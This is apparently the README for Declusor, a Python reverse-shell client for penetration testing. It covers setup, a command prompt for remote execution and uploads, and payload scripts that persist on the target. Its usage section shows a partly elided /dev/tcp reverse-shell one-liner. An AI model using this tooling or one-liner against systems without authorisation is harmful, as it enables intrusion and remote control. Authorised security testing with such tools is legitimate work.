# Declusor: A Python-Based Reverse Shell Client

Declusor is an extremely effective and flexible tool written in Python, designed with a modular architecture that allows its components to be easily customized. It's a valuable tool for penetration testers, CTF enthusiasts, and cybersecurity professionals, offering streamlined payload delivery and reliable remote control.

Its command-line interface significantly enhances productivity through intelligent command and file path completion, ensuring reliability and precision in remote operations.

[![asciicast](https://asciinema.org/a/zCmZ28Nyzw75buWlBl8SZf2Vq.svg)](https://asciinema.org/a/zCmZ28Nyzw75buWlBl8SZf2Vq)

> [!WARNING]
> **Legal Notice**: This software is strictly intended for educational purposes and authorized security research. The developers decline any responsibility arising from the misuse of this tool. The execution of Declusor is prohibited on networks or systems for which the operator does not hold ownership or explicit and documented authorization for penetration testing.

## Features

- **Reverse Shell Management**: Easily establish and interact with a reverse shell on a target machine.
- **Command Execution**: Execute arbitrary commands on the remote system with output captured by the client.
- **Interactive Shell**: Open a full interactive shell session for seamless interaction with the remote environment.
- **File Uploads**: Transfer files from the local machine to the remote target.
- **Payload Loading**: Load and execute shell scripts or other payloads from local files on the remote system.
- **Local Command Completion**: Features a custom command-line completer for easy navigation and command input, suggesting available commands and local file paths.

## Technical Architecture

Declusor is built with a modular design focusing on reliability and maintainability:

- **Core**: Robust session management using blocking sockets with optimized buffering (`bytearray`) for high‑performance data handling.
- **Controller**: Modular command handlers (`load`, `upload`, `shell`, etc.) allowing easy extension of functionality.
- **Interface**: Abstract base classes defining clear contracts for components.

## Getting Started

### Prerequisites

* **Python 3.x**: Ensure you have Python 3 installed on your local machine.
* **Unix‑like Operating System**: Declusor relies on some features which are standard on Linux, macOS, and other Unix‑like systems.

### Installation

Clone the Declusor repository to your local machine:

```bash
git clone https://github.com/othonhugo/declusor.git
cd declusor
chmod 700 ./declusor
```

No additional Python packages are required beyond the standard library.

### Quick Start

```bash
# Start the listener (replace IP and PORT as needed)
./declusor 127.0.0.1 4444
```
The client will output a Bash one‑liner. Execute that one‑liner on the target machine to establish the reverse shell.

## Usage

### Starting the Listener (Declusor Client)

Run the script with the desired IP and port:

```bash
./declusor <LISTENER_IP> <LISTENER_PORT>
```

**Example:**

```bash
$ ./declusor 127.0.0.1 4444
```
After running, Declusor prints a Bash one‑liner for the target.

### Establishing the Reverse Shell (Target Machine)

Copy the printed one‑liner and run it on the target machine:

```bash
( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3 >&3 2>&3 )
```

### Interacting with the Target

When the reverse shell is active, Declusor shows a `[declusor]` prompt. Available commands:

```
[declusor] help

load    : Load a payload from a file and send it to the remote system.
command : Execute a command on the remote system.
shell   : Open an interactive shell session with the target device.
upload  : Uploads a file to the target machine.
execute : Execute a file on the remote system.
help    : Display help information about available commands.
exit    : Exit the program.

[declusor] load info/tools.sh

USEFUL TOOLS
------------
/usr/bin/gcc
/usr/bin/wget
/usr/bin/curl
[declusor] 
```

## Customizing and Extending Payloads

To fully leverage `declusor`, you can create custom payloads or modify the existing ones. Start by exploring the `data` directory, which contains two key subdirectories: `lib` and `scripts`.

- **`data/lib/`**: This folder contains scripts that are automatically sent to the target immediately after a connection is established. These scripts are intended to persist in the target's memory, effectively allowing the target to "remember" the subroutines. Once stored, these subroutines can be used repeatedly in combination with your payloads.
- **`data/scripts/`**: This folder holds scripts that the target executes on demand. The output from these scripts is sent back to your server (or your prompt). The `load` command automatically scans this folder for available files and directories, simplifying the process of incorporating them into your payloads.

## Contributing

Contributions are welcome! This is an educational project, so clarity and correctness are prioritized over performance optimizations.

**Areas for contribution:**
- Additional usage examples
- Documentation improvements
- Test coverage expansion
- Bug fixes
- Code clarity improvements

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
